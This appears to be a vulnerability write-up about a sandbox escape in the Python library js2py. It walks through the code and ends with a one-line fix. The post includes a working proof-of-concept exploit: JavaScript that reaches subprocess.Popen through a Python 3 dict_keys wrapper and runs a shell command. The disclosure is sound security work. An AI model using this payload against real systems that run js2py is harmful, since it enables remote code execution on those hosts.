## Preface

js2py is a Python library commonly used in web scraping to parse and execute JavaScript code in a native Python environment. Crawlers typically use js2py to parse JavaScript fetched from the web to simulate a browser environment.

However, js2py has a feature that is extremely dangerous for crawlers: it supports importing and using Python packages from within JavaScript. In other words, js2py allows JavaScript code to control Python libraries and interact directly with the Python environment. Because of this, we can, similar to a Jinja SSTI, use a Python object inside the js2py environment to find the `subprocess.Popen` class and achieve RCE.

Moreover, as a widely used yet aging package from the Python 2 era, js2py is relatively easy to analyze.

## Code analysis

### JS-to-Python translation

After setting breakpoints, you can locate where the JS code is actually parsed: the `Eval` function in `host/jseval.py`. Setting a breakpoint there lets you see the Python code produced by js2py.

For example, this JS code

```js
let a = 114
console.log(a)
```

is eventually translated into the following Python code

```python
var.registers(['a'])
var.put('a', Js(114.0))
EVAL_RESULT = (var.get('console').callprop('log', var.get('a')))
```

You can see that variables at the JS layer are stored in the Python variable `var`. All JS-layer values are cleanly stored as instances of the `PyJs` class (here `Js` is actually a function, explained later). Functions are invoked via `callprop`. Under normal circumstances, JS code cannot touch Python objects.

While reading the code I noticed the author likes to build the final Python code through string concatenation. That suggested the possibility of crafting JS that generates illegal Python code and thus arbitrary code execution, but this route is much harder than the one below, so I didn’t pursue it.

### Converting Python data to JS data

To obtain Python objects and achieve RCE, we first need to examine how Python objects are converted into `PyJs` objects.

Locate the implementation of the `Js` function in `base.py`. `Js` converts a given Python value into the corresponding `PyJs` value so that JS code can manipulate it.

```python
def Js(val, Clamped=False):
    '''Converts Py type to PyJs type'''
    if isinstance(val, PyJs):
        return val
    elif val is None:
        return undefined
    elif isinstance(val, basestring):
        return PyJsString(val, StringPrototype)
    elif isinstance(val, bool):
        return true if val else false
    elif isinstance(val, float) or isinstance(val, int) or isinstance(
            val, long) or (NUMPY_AVAILABLE and isinstance(
                val,
                (numpy.int8, numpy.uint8, numpy.int16, numpy.uint16,
                 numpy.int32, numpy.uint32, numpy.float32, numpy.float64))):
        # This is supposed to speed things up. may not be the case
        if val in NUM_BANK:
            return NUM_BANK[val]
        return PyJsNumber(float(val), NumberPrototype)
    ... # some code omitted here
    else:  # try to convert to js object
        return py_wrap(val)
```

You can see that basic Python data structures such as bool, float, and list are converted into dedicated `PyJs` classes, while other types are handled by `py_wrap` and ultimately become instances of `PyObjectWrapper`.

Regular `PyJs` classes represent ordinary data such as numbers and booleans, whereas `PyObjectWrapper` represents special data such as Python modules. Therefore, if we can obtain a `PyObjectWrapper`, we can use attribute access—similar to Jinja SSTI—to achieve RCE.

Normally, data of type `PyObjectWrapper` are available only when the feature to import Python packages is enabled, allowing you to grab Python packages. But because `js2py` is old and did not carefully account for Python 2 vs. Python 3 differences, a sandbox escape resulted.

As an aside, when reading the implementation of `PyJs`, I found these lines:

```python
if six.PY3:
    PyJs.__hash__ = PyJs._fuck_python3
    PyJs.__truediv__ = PyJs.__div__
```

Safe to say the author really dislikes Python 3.

### Implementation of JS built-ins

While providing JS-to-Python translation, `js2py` also supplies built-in objects such as `console` and `Object` to support normal JS code execution.

Our end goal is to bypass the pyimport restriction and obtain a `PyObjectWrapper`. From the analysis above, to conjure a `PyObjectWrapper` out of nothing, we must examine the implementation of built-ins and extract a `PyObjectWrapper` from there.

Start reviewing the implementation of built-ins. In `constructors/jsobject.py` you can see the implementation of various functions on the `Object` object, including common functions such as `Object.keys`.

Then you find this function:

```python
    def getOwnPropertyNames(obj):
        if not obj.is_object():
            raise MakeError(
                'TypeError',
                'Object.getOwnPropertyDescriptor called on non-object')
        return obj.own.keys()
```

`js2py` uses a Python dict to represent a JS object, and `keys()` here calls Python’s dictionary `keys()`. Anyone who has used Python knows that in Python 2 this function returns a list, while in Python 3 it returns a `dict_keys` view. According to the `Js` function above, this `dict_keys` is converted into a `PyObjectWrapper`, which we can leverage to achieve RCE.

## Achieving RCE

First, verify that `getOwnPropertyNames` can indeed give us a `PyObjectWrapper`.

```python
import js2py

code = """
let a = Object.getOwnPropertyNames({})
console.log(a)
"""

js2py.eval_js(code)
```

It printed `PyObjectWrapper(dict_keys([]))`, so it works.

Next, from this object obtain the `__getattribute__` function, which makes RCE straightforward. When I wrote the PoC initially I overcomplicated it; in fact, using `__class__.__base__` is sufficient to reach `__getattribute__`.

From `__getattribute__` we can obtain the `object` class. Then, by writing a recursive function, we can find any class in any module. For RCE, we look for `subprocess.Popen`.

The new PoC is as follows:

```python
import js2py

code = """
let cmd = "id"
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__
let obj = a(a(a,"__class__"), "__base__")
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(result)
result
"""

js2py.eval_js(code)
```

## Fix

Since we know the issue lies in the `getOwnPropertyNames` function, convert the returned `dict_keys` into a plain list.
